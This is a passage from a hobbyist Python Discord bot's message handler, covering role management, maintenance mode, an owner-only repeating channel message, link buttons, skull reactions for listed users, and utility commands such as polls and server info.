        except ValueError:
            color = discord.Color.blue()

        await create_role(message.guild, name, color, f"Created by {message.author}", message.channel)

    # !roledelete
    elif message.content.startswith("!roledelete"):
        if not message.role_mentions:
            return await message.channel.send(embed=discord.Embed(
                title="Command : !roledelete",
                description="**Usage:**\n"
                            "```!roledelete @role```",
                color=discord.Color.blue()
            ))

        role = message.role_mentions[0]
        await delete_role(message.guild, role, f"Deleted by {message.author}", message.channel)

    # !rolerename
    elif message.content.startswith("!rolerename"):
        if len(args) < 3 or not message.role_mentions:
            return await message.channel.send(embed=discord.Embed(
                title="Command : !rolerename",
                description="**Usage**:\n"
                            "```!rolerename @role <new_name>```",
                color=discord.Color.blue()
            ))

        role = message.role_mentions[0]
        new_name = " ".join(args[2:])
        await rename_role(role, new_name, f"Renamed by {message.author}", message.channel)

    # !roleicon
    elif message.content.startswith("!roleicon"):
        if not message.role_mentions or not message.attachments:
            return await message.channel.send(embed=discord.Embed(
                title="Command : !roleicon",
                description="**Usage:**\n"
                            "```!roleicon @role with an image attachment```",
                color=discord.Color.blue()
            ))

        role = message.role_mentions[0]
        image_bytes = await message.attachments[0].read()
        await set_role_icon(role, image_bytes, f"Set by {message.author}", message.channel)

    # !role toggle
    elif len(args) > 0 and args[0] == "!role":
        if len(args) < 3 or not message.mentions:
            return await message.channel.send(embed=discord.Embed(
                title="Command : !role",
                description="**Usage:**\n"
                            "```!role @user Role Name```",
                color=discord.Color.blue()
            ))
    
        # your role handling code here
        member = message.mentions[0]
        role_name = message.content.split(None, 2)[2].replace(f"{member.mention}", "").strip()

        await toggle_user_role(
            ctx_author=message.author,
            bot_member=message.guild.me,
            guild=message.guild,
            member=member,
            role_name=role_name,
            channel=message.channel
        )
    
    if MAINTENANCE_MODE and message.author.id != YOUR_USER_ID:
        embed = discord.Embed(
            description="🛠️ The bot is currently under maintenance.\nPlease try again later.",
            color=discord.Color.orange()
        )
        await message.channel.send(embed=embed)
        return

    if message.content.startswith("!maintenance"):
        await handle_maintenance(message, bot)

    if message.content.startswith("!cancelmaintenance"):
        await handle_cancel_maintenance(message)
        return

    content = message.content
    if not content.startswith('!'):
        if message.author.id in bot.user_skull_list:
            await asyncio.sleep(1)
            await message.add_reaction("\u2620\ufe0f")
        return

    args = content.split()
    command = args[0][1:].lower()
    arguments = args[1:]

    if command == 'bc':
        await handle_bc(message, arguments)
        return

    # Ignore if it's a real command
    if message.content.startswith("!") and message.content[1:].split(" ")[0] in bot.all_commands:
        return

    content = message.content.lower()

    if content == "!start spam":
        if message.author.id == YOUR_USER_ID:
            channel = message.channel
            interval = 10  # seconds
            spam_message = "I'm alive and spamming!"
            await start_spam_manual(channel, interval, spam_message)

            embed = discord.Embed(
                title="Started Spamming!",
                description=f"Spamming every {interval} seconds.",
                color=discord.Color.green()
            )
            embed_message = await message.channel.send(embed=embed, delete_after=3)
            await message.delete(delay=1)
        else:
            await message.channel.send("You do not have permission to start spam.", delete_after=5)

    if content == "!stop spam":
        if message.author.id == YOUR_USER_ID:
            channel = message.channel
            stopped = await stop_spam_manual(channel)
            if stopped:
                embed = discord.Embed(
                    title="Stopped Spamming!",
                    description="No longer sending auto-messages.",
                    color=discord.Color.red()
                )
            else:
                embed = discord.Embed(
                    title="No Active Spam!",
                    description="There was no spam running in this channel.",
                    color=discord.Color.orange()
                )
            embed_message = await message.channel.send(embed=embed, delete_after=3)
            await message.delete(delay=1)
        else:
            await message.channel.send("You do not have permission to stop spam.", delete_after=5)

    # --- ADD BUTTON ---
    if content.startswith("!addbutton"):
        if message.author.id not in AUTHORIZED_USERS:
            embed = discord.Embed(
                title="Unauthorized",
                description="❌ You are not allowed to use this command.",
                color=discord.Color.red()
            )
            warning = await message.channel.send(embed=embed, delete_after=5)
            await asyncio.sleep(5)
            await message.delete()
            await warning.delete()
            return

        try:
            parts = message.content.split(" ", 3)
            message_id = int(parts[1])
            link = parts[2]
            label = parts[3] if len(parts) > 3 else "Click Here"
        except (IndexError, ValueError):
            embed = discord.Embed(
                title="Incorrect Usage",
                description="❗ Usage: `!addbutton <message_id> <link> <label>`",
                color=discord.Color.orange()
            )
            error = await message.channel.send(embed=embed, delete_after=5)
            await asyncio.sleep(5)
            await message.delete()
            await error.delete()
            return

        result = await add_button(bot, message.channel, message_id, link, label)
        embed = discord.Embed(
            title="✅ Button Added",
            description=result,
            color=discord.Color.green()
        )
        response = await message.channel.send(embed=embed, delete_after=5)
        await asyncio.sleep(5)
        await message.delete()
        await response.delete()

    # --- REMOVE BUTTON ---
    if content.startswith("!removebutton"):
        if message.author.id not in AUTHORIZED_USERS:
            embed = discord.Embed(
                title="Unauthorized",
                description="❌ You are not allowed to use this command.",
                color=discord.Color.red()
            )
            warning = await message.channel.send(embed=embed, delete_after=5)
            await asyncio.sleep(5)
            await message.delete()
            await warning.delete()
            return

        try:
            parts = message.content.split(" ", 2)
            message_id = int(parts[1])
            label = parts[2]
        except (IndexError, ValueError):
            embed = discord.Embed(
                title="Incorrect Usage",
                description="❗ Usage: `!removebutton <message_id> <label>`",
                color=discord.Color.orange()
            )
            error = await message.channel.send(embed=embed, delete_after=5)
            await asyncio.sleep(5)
            await message.delete()
            await error.delete()
            return

        result = await remove_button(bot, message.channel, message_id, label)
        embed = discord.Embed(
            title="✅ Button Removed",
            description=result,
            color=discord.Color.green()
        )
        response = await message.channel.send(embed=embed, delete_after=5)
        await asyncio.sleep(5)
        await message.delete()
        await response.delete()

    await bot.process_commands(message)

    if message.author.id in bot.user_skull_list:
        await message.add_reaction("\u2620\ufe0f")

    if message.content.startswith("!poll"):
        await handle_poll(message)

    elif message.content.startswith("!eightball"):
        await handle_eightball(message)

    elif message.content.startswith("!serverinfo"):
        await handle_serverinfo(message)

    elif message.content.startswith("!userinfo"):
        await handle_userinfo(message)

    elif message.content.startswith("!remind"):
        await handle_remind(message)

    elif message.content.startswith("!roleinfo"):
        await handle_roleinfo(message)        

# Run the bot
bot.run(TOKEN)
